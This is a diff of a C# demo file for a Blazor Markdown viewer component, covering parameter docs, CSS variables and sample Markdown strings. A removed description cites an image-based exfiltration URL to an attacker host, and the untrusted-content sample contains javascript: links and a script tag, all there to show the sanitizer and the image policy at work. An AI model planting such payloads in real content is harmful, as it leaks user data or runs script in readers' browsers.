@@ -2,130 +2,106 @@
 
 public partial class BitMarkdownViewerDemo
 {
-    private enum MarkdownFlavor { Basic, GitHub, Advanced }
-
     private readonly List<ComponentParameter> componentParameters =
     [
         new()
         {
-           Name = "Markdown",
-           Type = "string?",
+           Name = "CodeBlockTemplate",
+           Type = "RenderFragment<BitMarkdownCodeBlockNode>?",
            DefaultValue = "null",
-           Description = "The Markdown string value to render as html elements.",
+           Description = "Renders every fenced or indented code block instead of the default pre/code - for a syntax highlighter, a copy button or a diagram renderer. The language is Info, the source Content. The output is outside the viewer's stylesheet.",
         },
         new()
         {
-           Name = "Pipeline",
-           Type = "BitMarkdownPipeline?",
-           DefaultValue = "null",
-           Description = @"The processing pipeline (flavor set). Defaults to the basic CommonMark core with no extensions.
-                           Use one of the ready-made pipelines on BitMarkdownPipelines (Basic, GitHub, Advanced)
-                           or build a custom one with BitMarkdownPipelineBuilder.",
-           LinkType = LinkType.Link,
-           Href = "#markdown-viewer-pipeline",
+           Name = "HeadingLevelOffset",
+           Type = "int",
+           DefaultValue = "0",
+           Description = "Shifts every heading down by this many levels (with 1, # renders as h2), clamped to h1-h6, so the document's outline nests under the page it is placed in.",
         },
         new()
         {
            Name = "ImageRendering",
            Type = "BitMarkdownViewerImageRendering",
            DefaultValue = "BitMarkdownViewerImageRendering.SameOrigin",
-           Description = @"Controls whether remote images are allowed to load, guarding against silent data-exfiltration
-                           via auto-fetched image URLs (for example ![x](https://attacker.com/leak?data=SECRET)).
-                           Defaults to the safe SameOrigin policy; set it to All to load every remote image when the
-                           source is fully trusted, or None for the strictest policy.",
+           Description = "Which images may load. A remote image is fetched the moment it renders, leaking whatever its URL encodes; SameOrigin blocks cross-origin images, None blocks all, All is for trusted sources. A blocked image keeps its alt text.",
            LinkType = LinkType.Link,
            Href = "#markdown-viewer-image-rendering-enum",
-        },
-        new()
-        {
-           Name = "Inline",
-           Type = "bool",
-           DefaultValue = "false",
-           Description = @"Renders the document as inline content: the root element becomes a span and each top-level
-                           paragraph contributes its inline content directly, without the <p> that would otherwise force
-                           a line of its own. Use it where a short piece of Markdown has to sit inside a sentence, a
-                           table cell or a label. Blocks that are not paragraphs (lists, tables, headings) still render
-                           as themselves.",
-        },
-        new()
-        {
-           Name = "MaxNestingDepth",
-           Type = "int",
-           DefaultValue = "100",
-           Description = @"The maximum block/inline nesting depth allowed while parsing. Content nested deeper than this is rendered
-                           as plain text instead of being parsed further. An always-on safeguard against denial-of-service via
-                           pathologically nested input (e.g. thousands of nested blockquotes) that would otherwise overflow the
-                           stack. Values <= 0 fall back to the default. Legitimate documents never approach this limit.",
-        },
-        new()
-        {
-           Name = "MaxLength",
-           Type = "int",
-           DefaultValue = "0",
-           Description = @"When greater than zero, the Markdown source is truncated to this many characters before parsing,
-                           bounding the work done on untrusted input. The cut never splits a surrogate pair.
-                           Defaults to 0 (no limit).",
-        },
-        new()
-        {
-           Name = "OnParsed",
-           Type = "EventCallback<BitMarkdownDocumentNode>",
-           DefaultValue = "",
-           Description = @"Called after the Markdown source has been parsed, with the document that is about to be rendered.
-                           The tree is the same one the renderer walks, so a handler can read it - to build a table of contents
-                           from the headings, for example - or rewrite it before it reaches the DOM.",
-           LinkType = LinkType.Link,
-           Href = "#markdown-viewer-document-node",
-        },
-        new()
-        {
-           Name = "CodeBlockTemplate",
-           Type = "RenderFragment<BitMarkdownCodeBlockNode>?",
-           DefaultValue = "null",
-           Description = @"Renders every fenced or indented code block, instead of the <pre><code> the viewer would otherwise
-                           draw. This is where a syntax highlighter, a copy button or a diagram renderer goes: the template
-                           is given the block, so it can read the language off Info and the source off Content.",
         },
         new()
         {
            Name = "ImageTemplate",
            Type = "RenderFragment<BitMarkdownImageNode>?",
            DefaultValue = "null",
-           Description = @"Renders every image, instead of the <img> the viewer would otherwise draw - for a lightbox, a
-                           placeholder while it loads, or a component that serves a modern format. The ImageRendering
-                           policy has already been applied, so a blocked image reaches the template with an empty Url.",
+           Description = "Renders every image instead of the default img - for a lightbox or a placeholder. The ImageRendering policy has already run, so a blocked image arrives with an empty Url.",
+        },
+        new()
+        {
+           Name = "Inline",
+           Type = "bool",
+           DefaultValue = "false",
+           Description = "Renders the root as a span and drops the paragraph wrappers, so a short piece of Markdown can sit inside a sentence, a cell or a label. Other blocks still render as themselves.",
         },
         new()
         {
            Name = "LinkTemplate",
            Type = "RenderFragment<BitMarkdownLinkNode>?",
            DefaultValue = "null",
-           Description = @"Renders every link, instead of the <a> the viewer would otherwise draw - to route an in-app
-                           destination through the router, or to decorate an external one. The destination has already been
-                           sanitized. A link's own content is not rendered for you; read
-                           BitMarkdownInlineHelpers.PlainText(context.Children) for its text.",
+           Description = "Renders every link instead of the default anchor - to route through the router or decorate external links. The URL is already sanitized; read the text with BitMarkdownInlineHelpers.PlainText(context.Children).",
+        },
+        new()
+        {
+           Name = "Markdown",
+           Type = "string?",
+           DefaultValue = "null",
+           Description = "The Markdown source to render.",
+        },
+        new()
+        {
+           Name = "MaxLength",
+           Type = "int",
+           DefaultValue = "0",
+           Description = "When greater than zero, the source is truncated to this many characters before parsing (never inside a surrogate pair). 0 means no limit.",
+        },
+        new()
+        {
+           Name = "MaxNestingDepth",
+           Type = "int",
+           DefaultValue = "100",
+           Description = "The maximum block/inline nesting depth; deeper content renders as plain text. An always-on guard against stack exhaustion by hostile input; values <= 0 fall back to 100.",
+        },
+        new()
+        {
+           Name = "OnParsed",
+           Type = "EventCallback<BitMarkdownDocumentNode>",
+           DefaultValue = "",
+           Description = "Raised after each parse with the document about to be rendered - to read a table of contents or front matter out of it, or rewrite it.",
+           LinkType = LinkType.Link,
+           Href = "#markdown-viewer-document-node",
         },
         new()
         {
            Name = "OnTaskChanged",
            Type = "EventCallback<BitMarkdownViewerTaskChangedEventArgs>",
            DefaultValue = "",
-           Description = @"Called when a reader ticks or unticks a task-list checkbox, with the source rewritten to match.
-                           Setting it is what makes the checkboxes interactive at all: with no handler they stay the
-                           read-only boxes GitHub renders. The viewer does not change Markdown itself - it hands you the
-                           new source and leaves storing it to you. Requires the task-list flavor.",
+           Description = "Raised when a task-list checkbox is ticked, with the source rewritten to match. Setting it is what enables the checkboxes (unless the viewer is disabled); the viewer never changes Markdown itself.",
            LinkType = LinkType.Link,
            Href = "#markdown-viewer-task-changed-args",
+        },
+        new()
+        {
+           Name = "Pipeline",
+           Type = "BitMarkdownPipeline?",
+           DefaultValue = "null",
+           Description = "The flavors the source is parsed with. Defaults to the CommonMark core; use BitMarkdownPipelines (Basic, GitHub, Advanced) or build one with BitMarkdownPipelineBuilder.",
+           LinkType = LinkType.Link,
+           Href = "#markdown-viewer-pipeline",
         },
         new()
         {
            Name = "StripBidiControlCharacters",
            Type = "bool",
            DefaultValue = "false",
-           Description = @"When true, Unicode bidirectional control characters are stripped from the source before parsing,
-                           neutralizing 'Trojan Source' (CVE-2021-42574) spoofing where text is made to display in a different
-                           order than it is encoded. Recommended for untrusted or AI-generated Markdown. Zero-width joiners used
-                           by emoji and complex scripts are never removed.",
+           Description = "Strips the Unicode bidirectional control characters before parsing, neutralizing 'Trojan Source' (CVE-2021-42574) spoofing. Recommended for untrusted or AI-generated Markdown.",
         },
     ];
 
@@ -575,7 +551,7 @@ public partial class BitMarkdownViewerDemo
                 new() { Name = "Table", Type = "string", DefaultValue = "Table", Description = "The accessible name of the scrollable region a table sits in." },
                 new() { Name = "PermalinkTo", Type = "string", DefaultValue = "Permalink to {0}", Description = "The accessible name of a heading's permalink, given the heading's text." },
                 new() { Name = "PermalinkToSection", Type = "string", DefaultValue = "Permalink to this section", Description = "The accessible name of a permalink whose heading has no text of its own." },
-                new() { Name = "Task", Type = "string", DefaultValue = "Task {0}", Description = "The accessible name of an interactive task-list checkbox, given its number." },
+                new() { Name = "Task", Type = "string", DefaultValue = "Task {0}", Description = "The accessible name of an interactive task-list checkbox whose item has no text, given its number (a box is otherwise named after its item)." },
             ]
         },
         new()
@@ -615,6 +591,29 @@ public partial class BitMarkdownViewerDemo
             Description = "Walks an AST and dispatches each node to a matching node renderer. Renderers are probed in reverse registration order, so the last renderer registered for a node type wins, allowing pipeline extensions to override the core renderers.",
             Parameters =
             [
+                new()
+                {
+                    Name = "Texts",
+                    Type = "BitMarkdownTexts",
+                    DefaultValue = "",
+                    Description = "The words the renderers write themselves.",
+                    LinkType = LinkType.Link,
+                    Href = "#markdown-viewer-texts",
+                },
+                new()
+                {
+                    Name = "DocumentUrl",
+                    Type = "string?",
+                    DefaultValue = "null",
+                    Description = "The page the output is placed in (init-only). When set, an in-page destination (#id) is written as this address plus the fragment, so a <base href> cannot send it to another page. The viewer sets it for you.",
+                },
+                new()
+                {
+                    Name = "ResolveInPageUrl",
+                    Type = "string ResolveInPageUrl(string url)",
+                    DefaultValue = "",
+                    Description = "Returns an in-page destination prefixed with DocumentUrl, anything else unchanged. A custom node renderer writing an href should go through it.",
+                },
                 new()
                 {
                     Name = "WriteNodes",
@@ -691,113 +690,143 @@ public partial class BitMarkdownViewerDemo
         },
     ];
 
+    private readonly List<ComponentCssVariable> componentCssVariables =
+    [
+        new() { Name = "--bit-MarkdownViewer-color", DefaultValue = "var(--bit-clr-fg-pri)", Description = "Text color of the document." },
+        new() { Name = "--bit-MarkdownViewer-font-family", DefaultValue = "inherit", Description = "Font of the document." },
+        new() { Name = "--bit-MarkdownViewer-font-size", DefaultValue = "inherit", Description = "Font size of the document; every block scales with it." },
+        new() { Name = "--bit-MarkdownViewer-line-height", DefaultValue = "1.6", Description = "Line height of the document." },
+        new() { Name = "--bit-MarkdownViewer-block-spacing", DefaultValue = "1em", Description = "Room under each block (paragraph, list, table, code block, ...)." },
+        new() { Name = "--bit-MarkdownViewer-heading-color", DefaultValue = "inherit", Description = "Text color of the headings (h6 falls back to var(--bit-clr-fg-sec))." },
+        new() { Name = "--bit-MarkdownViewer-heading-font-family", DefaultValue = "inherit", Description = "Font of the headings." },
+        new() { Name = "--bit-MarkdownViewer-heading-font-weight", DefaultValue = "var(--bit-tpg-fw-semibold)", Description = "Weight of the headings." },
+        new() { Name = "--bit-MarkdownViewer-heading-border-color", DefaultValue = "var(--bit-clr-brd-sec)", Description = "Rule under the h1 and h2 headings." },
+        new() { Name = "--bit-MarkdownViewer-link-color", DefaultValue = "var(--bit-clr-pri-fg)", Description = "Text color of the links." },
+        new() { Name = "--bit-MarkdownViewer-link-hover-color", DefaultValue = "var(--bit-MarkdownViewer-link-color)", Description = "Text color of a link under the pointer." },
+        new() { Name = "--bit-MarkdownViewer-link-decoration", DefaultValue = "underline", Description = "text-decoration-line of the links at rest. Keep a non-color cue if you remove it (WCAG 1.4.1)." },
+        new() { Name = "--bit-MarkdownViewer-code-font-family", DefaultValue = "var(--bit-tpg-font-family-mono)", Description = "Font of the code spans, code blocks and math." },
+        new() { Name = "--bit-MarkdownViewer-code-color", DefaultValue = "inherit", Description = "Text color of the code spans." },
+        new() { Name = "--bit-MarkdownViewer-code-background", DefaultValue = "color-mix(in srgb, var(--bit-clr-fg-pri) 8%, transparent)", Description = "Background of the code spans." },
+        new() { Name = "--bit-MarkdownViewer-code-radius", DefaultValue = "var(--bit-shp-radius-control)", Description = "Corner radius of the code spans." },
+        new() { Name = "--bit-MarkdownViewer-code-block-color", DefaultValue = "inherit", Description = "Text color of the code blocks." },
+        new() { Name = "--bit-MarkdownViewer-code-block-background", DefaultValue = "color-mix(in srgb, var(--bit-clr-fg-pri) 5%, transparent)", Description = "Background of the code blocks." },
+        new() { Name = "--bit-MarkdownViewer-code-block-padding", DefaultValue = "spacing(2)", Description = "Padding of the code blocks." },
+        new() { Name = "--bit-MarkdownViewer-code-block-radius", DefaultValue = "var(--bit-shp-radius-surface)", Description = "Corner radius of the code blocks." },
+        new() { Name = "--bit-MarkdownViewer-blockquote-color", DefaultValue = "var(--bit-clr-fg-sec)", Description = "Text color of the block quotes." },
+        new() { Name = "--bit-MarkdownViewer-blockquote-border-color", DefaultValue = "var(--bit-clr-brd-pri)", Description = "Bar down the start edge of the block quotes." },
+        new() { Name = "--bit-MarkdownViewer-table-border-color", DefaultValue = "var(--bit-clr-brd-pri)", Description = "Borders of the table cells." },
+        new() { Name = "--bit-MarkdownViewer-table-header-background", DefaultValue = "transparent", Description = "Background of the header row." },
+        new() { Name = "--bit-MarkdownViewer-table-stripe-background", DefaultValue = "color-mix(in srgb, var(--bit-clr-fg-pri) 4%, transparent)", Description = "Background of every second body row." },
+        new() { Name = "--bit-MarkdownViewer-table-cell-padding", DefaultValue = "spacing(0.75) spacing(1.625)", Description = "Padding of the table cells." },
+        new() { Name = "--bit-MarkdownViewer-rule-color", DefaultValue = "var(--bit-clr-brd-pri)", Description = "Color of the thematic break (hr) and of the rule above the footnotes." },
+        new() { Name = "--bit-MarkdownViewer-rule-thickness", DefaultValue = "0.25em", Description = "Thickness of the thematic break (hr)." },
+        new() { Name = "--bit-MarkdownViewer-mark-color", DefaultValue = "inherit", Description = "Text color of the highlighted (==mark==) text." },
+        new() { Name = "--bit-MarkdownViewer-mark-background", DefaultValue = "color-mix(in srgb, var(--bit-clr-wrn) 35%, transparent)", Description = "Background of the highlighted (==mark==) text." },
+        new() { Name = "--bit-MarkdownViewer-container-background", DefaultValue = "color-mix(in srgb, var(--bit-clr-fg-pri) 4%, transparent)", Description = "Background of the ::: containers." },
+        new() { Name = "--bit-MarkdownViewer-note-color", DefaultValue = "var(--bit-clr-inf-fg)", Description = "Bar and title of the NOTE alerts and of the note/info containers." },
+        new() { Name = "--bit-MarkdownViewer-tip-color", DefaultValue = "var(--bit-clr-suc-fg)", Description = "Bar and title of the TIP alerts and of the tip/success containers." },
+        new() { Name = "--bit-MarkdownViewer-important-color", DefaultValue = "var(--bit-clr-pri-fg)", Description = "Bar and title of the IMPORTANT alerts." },
+        new() { Name = "--bit-MarkdownViewer-warning-color", DefaultValue = "var(--bit-clr-wrn-fg)", Description = "Bar and title of the WARNING alerts and of the warning containers." },
+        new() { Name = "--bit-MarkdownViewer-caution-color", DefaultValue = "var(--bit-clr-err-fg)", Description = "Bar and title of the CAUTION alerts and of the caution/danger containers." },
+    ];
 
 
-    // -- GitHub flavored example ---------------------------------------------
 
-    private readonly string gitHubMarkdown = @"# GitHub Flavored Markdown
+    private readonly string basicMarkdown = @"# Native Markdown in Blazor
 
-Supports ~~strikethrough~~ and bare links like https://bitplatform.dev
+Rendered entirely in **C#** with *no* JavaScript - see the [bit platform][bit] site.
 
-## Task list
+- Real DOM output
+- Safe by default
+    1. URLs sanitized
+    2. Raw HTML shown as text
+
+> Character references decode: &copy; 2026 &mdash; but `&copy;` stays literal in code.
+
+```csharp
+var html = ""no innerHTML"";
+```
+
+[bit]: https://bitplatform.dev ""bit platform""
+";
+
+
+
+    private readonly string gitHubMarkdown = @"Supports ~~strikethrough~~ and bare links like https://bitplatform.dev,
+plus footnotes[^1].
 
 - [x] Parse Markdown in pure C#
-- [x] Render the real render tree
 - [ ] Use any JavaScript
-
-## Table
 
 | Feature       | Basic | GitHub |
 |:--------------|:-----:|:------:|
 | Headings      |   ✔   |   ✔    |
 | Tables        |       |   ✔    |
-| Strikethrough |       |   ✔    |
-";
 
-
-
-    // -- Alerts example ------------------------------------------------------
-
-    private readonly string alertsMarkdown = @"> [!NOTE]
-> Useful information that users should know, even when skimming content.
+> [!NOTE]
+> Useful information that users should know, even when skimming.
 
 > [!TIP]
-> Helpful advice for doing things better or more easily.
+> Helpful advice for doing things better.
 
 > [!IMPORTANT]
-> Key information users need to know to achieve their goal.
+> Key information users need to achieve their goal.
 
 > [!WARNING]
-> Urgent info that needs immediate user attention to avoid problems.
+> Urgent info that needs immediate attention.
 
 > [!CAUTION]
-> Advises about risks or negative outcomes of certain actions.
+> Advises about the risks of an action.
 
-> A block quote without a marker is still an ordinary block quote.
+[^1]: Numbered in citation order and gathered at the end, each with a back-link.
 ";
 
 
 
-    // -- Footnotes example ---------------------------------------------------
-
-    private readonly string footnotesMarkdown = @"The parser walks the source once[^once] and hands the renderer an AST[^ast],
-which is why the same note can be cited twice[^once].
-
-[^once]: One pass over the lines, then one pass over the inline text of each block.
-[^ast]: An abstract syntax tree - the tree of headings, paragraphs and inline runs
-    that the render tree is built from.
-";
-
-
-
-    // -- References & entities example ---------------------------------------
-
-    private readonly string referencesMarkdown = @"# Reference links
-
-The [bit platform][bit] site, the [Blazor docs][docs], and the same
-[bit] link again as a shortcut reference.
-
-Character references are decoded too: &copy; 2026 &mdash; &#169; is the same
-sign written as a number, and &#x2705; as hex. Inside code they stay literal:
-`&copy;`.
-
-[bit]: https://bitplatform.dev ""bit platform""
-[docs]: https://learn.microsoft.com/aspnet/core/blazor ""ASP.NET Core Blazor""
-";
-
-
-
-    // -- Emphasis extras example ---------------------------------------------
-
-    private readonly BitMarkdownPipeline emphasisExtrasPipeline = new BitMarkdownPipelineBuilder()
-        .UseEmphasisExtras()
+    private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
+        .UsePipeTables()
+        .UseStrikethrough()
+        .UseTaskLists()
+        .UseEmojis()
         .Build();
 
-    private readonly string emphasisExtrasMarkdown = @"Water is H~2~O, the area of a circle is πr^2^, and 2^10^ = 1024.
+    private readonly string customMarkdown = @"# Custom pipeline :sparkles:
 
-This release ++adds streaming++ and ~~drops the old overload~~, so ==read the migration notes== first.
+Only pipe tables, strikethrough, task lists and emoji were picked.
+Autolinks were left out, so https://bitplatform.dev stays plain text.
 
-Ordinary prose is left alone: 1 + 2 = 3, and a+b is not inserted text.
+- [x] ~~Old~~ approach replaced
+- [ ] Anything left to do?
 ";
 
 
 
-    // -- Typography example --------------------------------------------------
-
-    private readonly BitMarkdownPipeline smartyPantsPipeline = new BitMarkdownPipelineBuilder()
+    private readonly BitMarkdownPipeline typographyPipeline = new BitMarkdownPipelineBuilder()
+        .UseEmphasisExtras()
         .UseSmartyPants()
         .Build();
 
-    private readonly string typographyMarkdown = @"""Typography matters,"" she said -- and it's hard to disagree...
+    private readonly string typographyMarkdown = @"Water is H~2~O, the area of a circle is πr^2^, and this release ++adds streaming++
+and ~~drops the old overload~~ - so ==read the migration notes== first.
 
-The 2024--2026 range uses an en dash; an aside uses an em dash --- like this one.
+""Typography matters,"" she said -- and it's hard to disagree... The 2024--2026 range
+uses an en dash; an aside uses an em dash --- like this one.
 
-Code keeps every character: `--- ""not curled"" ...`
+Code keeps every character: `--- ""not curled"" ...` and 1 + 2 = 3 is plain prose.
 ";
 
 
 
-    // -- Front matter example ------------------------------------------------
+    private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
+        .UseSoftLineAsHardLine()
+        .Build();
+
+    private readonly string lineBreaksMarkdown = @"Roses are red
+Violets are blue
+Markdown reflows
+Unless you tell it not to";
+
+
 
     private readonly BitMarkdownPipeline frontMatterPipeline = new BitMarkdownPipelineBuilder()
         .UseFrontMatter()
@@ -814,7 +843,6 @@ Code keeps every character: `--- ""not curled"" ...`
     private readonly string frontMatterMarkdown = @"---
 title: Release notes
 date: 2026-09-09
-tags: [blazor, markdown]
 ---
 
 # Release notes
@@ -823,8 +851,6 @@ The metadata above describes the file; it is not part of the document.
 ";
 
 
-
-    // -- Containers example --------------------------------------------------
 
     private readonly BitMarkdownPipeline containersPipeline = new BitMarkdownPipelineBuilder()
         .UseContainers()
@@ -844,8 +870,6 @@ Containers nest, so an aside can sit inside one.
 :::
 
 :::details How the fence is read
-The word after the fence names the container; the rest of the line is its title.
-
 This one is a real `<details>`, so it opens and closes.
 :::
 
@@ -856,48 +880,26 @@ A name the stylesheet has no opinion about is a plain block you style yourself.
 
 
 
-    // -- Definition list example ---------------------------------------------
-
-    private readonly BitMarkdownPipeline definitionListPipeline = new BitMarkdownPipelineBuilder()
+    private readonly BitMarkdownPipeline documentationPipeline = new BitMarkdownPipelineBuilder()
         .UseDefinitionLists()
+        .UseAbbreviations()
+        .UseFigures()
         .Build();
 
-    private readonly string definitionListMarkdown = @"Pipeline
+    private readonly string documentationMarkdown = @"*[AST]: Abstract Syntax Tree
+*[HTML]: HyperText Markup Language
+
+Pipeline
 : The immutable set of flavors a document is parsed with.
 : Build it once and share it.
 
 AST
-: The tree of headings, paragraphs and inline runs the parser produces.
+: The tree the parser produces and the renderer writes HTML from.
 
-    A definition indented under its own text may run to several paragraphs,
-    or hold a list:
-
-    - one
-    - two
+![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png ""A titled image becomes a captioned figure"")
 ";
 
 
-
-    // -- Abbreviations example -----------------------------------------------
-
-    private readonly BitMarkdownPipeline abbreviationPipeline = new BitMarkdownPipelineBuilder()
-        .UseAbbreviations()
-        .Build();
-
-    private readonly string abbreviationMarkdown = @"*[HTML]: HyperText Markup Language
-*[AST]: Abstract Syntax Tree
-*[CSP]: Content Security Policy
-
-The parser builds an AST and the renderer writes HTML from it, which is what keeps
-the output usable under a strict CSP.
-
-Only whole words are expanded, so HTMLElement keeps its own name and `HTML` inside
-code stays literal.
-";
-
-
-
-    // -- Mathematics example -------------------------------------------------
 
     private readonly BitMarkdownPipeline mathPipeline = new BitMarkdownPipelineBuilder()
         .UseMathematics()
@@ -914,58 +916,6 @@ Prices are left alone: this costs $5 and that one $10.
 
 
 
-    // -- Figures example -----------------------------------------------------
-
-    private readonly BitMarkdownPipeline figurePipeline = new BitMarkdownPipelineBuilder()
-        .UseFigures()
-        .Build();
-
-    private readonly string figureMarkdown = @"![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png ""The logo, as a captioned figure"")
-
-An image with no title stays an ordinary image:
-
-![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)
-";
-
-
-
-    // -- Line breaks example -------------------------------------------------
-
-    private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
-        .UseSoftLineAsHardLine()
-        .Build();
-
-    private readonly string lineBreaksMarkdown = @"Roses are red
-Violets are blue
-Markdown reflows
-Unless you tell it not to";
-
-
-
-    // -- Custom pipeline example ---------------------------------------------
-
-    private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
-        .UsePipeTables()
-        .UseStrikethrough()
-        .UseTaskLists()
-        .UseEmojis()
-        .UseAutoIdentifiers()
-        .Build();
-
-    private readonly string customMarkdown = @"# Custom pipeline :sparkles:
-
-This viewer uses a pipeline composed with only the extensions we picked:
-pipe tables, strikethrough, task lists, emoji and auto identifiers.
-Autolinks were left out, so https://bitplatform.dev stays plain text.
-
-- [x] ~~Old~~ approach replaced
-- [ ] Anything left to do?
-";
-
-
-
-    // -- Untrusted content example -------------------------------------------
-
     private static readonly BitMarkdownViewerImageRendering[] imageRenderingModes =
     [
         BitMarkdownViewerImageRendering.SameOrigin,
@@ -975,9 +925,7 @@ Autolinks were left out, so https://bitplatform.dev stays plain text.
 
     private BitMarkdownViewerImageRendering imageRendering = BitMarkdownViewerImageRendering.SameOrigin;
 
-    private readonly string untrustedMarkdown = @"### Content from somewhere else
-
-A same-origin image always loads:
+    private readonly string untrustedMarkdown = @"A same-origin image loads unless the policy is `None`:
 
 ![the bit logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)
 
@@ -986,14 +934,10 @@ A cross-origin one only loads under `All`:
 ![a remote badge](https://img.shields.io/nuget/v/Bit.BlazorUI.Extras)
 
 Unsafe URLs never survive the sanitizer, whatever the policy:
-[a javascript link](javascript:alert(1)) and ![an unsafe image](javascript:alert(1)).
-
-Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
+[a javascript link](javascript:alert(1)). Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
 ";
 
 
-
-    // -- Table of contents example -------------------------------------------
 
     private record TocEntry(int Level, string Id, string Text);
 
@@ -1001,7 +945,11 @@ Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
 
     private string tocExcerpt = string.Empty;
 
-    private void HandleParsed(BitMarkdownDocumentNode document)
+    private readonly BitMarkdownPipeline tocPipeline = new BitMarkdownPipelineBuilder()
+        .UseAutoIdentifiers(anchorLinks: true)
+        .Build();
+
+    private void HandleTocParsed(BitMarkdownDocumentNode document)
     {
         tocEntries = BitMarkdownAstHelper.Descendants(document)
                                          .OfType<BitMarkdownHeadingNode>()
@@ -1013,46 +961,44 @@ Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
         tocExcerpt = text.Length > 120 ? text[..120] + "..." : text;
     }
 
-    private readonly string tocMarkdown = @"# Release notes
+    private readonly string tocMarkdown = @"## Installation {#install}
 
-## 9.4.0
-
-### Added
-
-Footnotes, alerts and reference links.
-
-### Fixed
-
-Truncation no longer splits a surrogate pair.
-
-## 9.3.0
-
-### Added
-
-The whole native parser.
-";
-
-
-
-    // -- Heading anchors example ---------------------------------------------
-
-    private readonly BitMarkdownPipeline anchorsPipeline = new BitMarkdownPipelineBuilder()
-        .UseAutoIdentifiers(anchorLinks: true)
-        .Build();
-
-    private readonly string anchorsMarkdown = @"## Installation {#install}
-
-Hover a heading to reveal the permalink beside it. This one names its own id, so the
-link to it survives a rewording of the heading.
-
-### Package manager
+Hover a heading for its permalink. This one names its own id, so links to it survive a rewording.
 
 ### .NET CLI
+
+Run `dotnet add package Bit.BlazorUI.Extras`.
+
+## Release notes
+
+### Added
+
+Footnotes, alerts and reference links - see [Installation](#install) first.
 ";
 
 
 
-    // -- Templates example ---------------------------------------------------
+    private readonly BitMarkdownPipeline linkPolicyPipeline = new BitMarkdownPipelineBuilder()
+        .UseLinkOptions(externalTarget: BitMarkdownLinkTarget.Self,
+                        externalRel: "noopener noreferrer nofollow ugc")
+        .Build();
+
+    private readonly string linkPolicyMarkdown = @"A link a reader wrote to [somewhere else](https://example.com)
+opens in the same tab and is marked `nofollow ugc`.
+
+A link to [another page here](/components/markdowneditor) is untouched.
+";
+
+    private readonly BitMarkdownPipeline baseUrlPipeline = new BitMarkdownPipelineBuilder()
+        .UseBaseUrl("/_content/Bit.BlazorUI.Demo.Client.Core/images/")
+        .Build();
+
+    private readonly string baseUrlMarkdown = @"![the bit logo](bit-logo-blue.png)
+
+The image is written with a relative path, the way a README writes one.
+";
+
+
 
     private readonly string templatesMarkdown = @"Every code block below is drawn by the template, not by the viewer:
 
@@ -1064,22 +1010,17 @@ var pipeline = new BitMarkdownPipelineBuilder().UseGitHubFlavored().Build();
 dotnet add package Bit.BlazorUI.Extras
 ```
 
-And every link, like [the bit platform](https://bitplatform.dev), gets its own chrome.
+And every link, like [the bit platform](https://bitplatform.dev), is a BitLink.
 ";
 
 
 
-    // -- Interactive task lists example --------------------------------------
+    private bool tasksEnabled = true;
 
     private string taskListMarkdown = @"## Release checklist
 
 - [x] Write the parser
-- [x] Write the renderer
 - [ ] Write the docs
-- [ ] Ship it
-
-Nested items count too:
-
 - [ ] Polish
     - [ ] Icons
     - [ ] Copy
@@ -1096,69 +1037,53 @@ Nested items count too:
 
 
 
-    // -- Link policy example -------------------------------------------------
-
-    private readonly BitMarkdownPipeline linkPolicyPipeline = new BitMarkdownPipelineBuilder()
-        .UseLinkOptions(externalTarget: BitMarkdownLinkTarget.Self,
-                        externalRel: "noopener noreferrer nofollow ugc")
-        .Build();
-
-    private readonly string linkPolicyMarkdown = @"A link a reader wrote to [somewhere else](https://example.com)
-opens in the same tab and is marked `nofollow ugc`.
-
-A link to [another page here](/components/markdownviewer) is untouched, and so is one to
-[a section](#example1) of this page.
-";
-
-
-
-    // -- Rewriting URLs example ----------------------------------------------
-
-    private readonly BitMarkdownPipeline baseUrlPipeline = new BitMarkdownPipelineBuilder()
-        .UseBaseUrl("/_content/Bit.BlazorUI.Demo.Client.Core/images/")
-        .Build();
-
-    private readonly string baseUrlMarkdown = @"![the bit logo](bit-logo-blue.png)
-
-The image above is written with a relative path, the way a README in a repository writes one.
-An [absolute link](https://bitplatform.dev) is left alone.
-";
-
-
-
-    // -- Localization example ------------------------------------------------
-
     private readonly BitMarkdownPipeline localizedPipeline = new BitMarkdownPipelineBuilder()
         .UseGitHubFlavored()
         .UseTexts(new BitMarkdownTexts
         {
-            AlertNote = "توجه",
-            AlertTip = "نکته",
-            AlertImportant = "مهم",
-            AlertWarning = "هشدار",
-            AlertCaution = "احتیاط",
-            Footnotes = "پی‌نوشت‌ها",
-            FootnoteBackReference = "بازگشت به ارجاع {0}",
-            FootnoteBackReferenceOccurrence = "بازگشت به ارجاع {0}-{1}",
-            Table = "جدول",
+            AlertNote = "Hinweis",
+            AlertTip = "Tipp",
+            AlertImportant = "Wichtig",
+            AlertWarning = "Warnung",
+            AlertCaution = "Vorsicht",
+            Footnotes = "Fußnoten",
+            FootnoteBackReference = "Zurück zur Referenz {0}",
+            FootnoteBackReferenceOccurrence = "Zurück zur Referenz {0}-{1}",
+            Table = "Tabelle",
+            Task = "Aufgabe {0}",
         })
         .Build();
 
     private readonly string localizedMarkdown = @"> [!WARNING]
-> عنوان این کادر از تنظیمات زبان خوانده می‌شود، نه از متن.
+> Der Titel dieses Kastens kommt aus den Texten der Pipeline, nicht aus dem Dokument.
 
-جدول و پی‌نوشت هم نام‌های خودشان را از همان‌جا می‌گیرند[^۱].
+Auch die Tabelle und die Fußnote[^1] tragen deutsche Namen.
 
-| ستون | مقدار |
-|:-----|------:|
-| یک   |     ۱ |
+| Spalte | Wert |
+|:-------|-----:|
+| eins   |    1 |
 
-[^۱]: نام پیوند بازگشت هم ترجمه شده است.
+[^1]: Ihr Rücklink wird als „Zurück zur Referenz 1“ angesagt.
 ";
 
 
 
-    // -- Playground example --------------------------------------------------
+    private readonly string commentMarkdown = @"# Looks good to me
+
+Tested on **Firefox** and **Safari**. One nit:
+
+## Naming
+
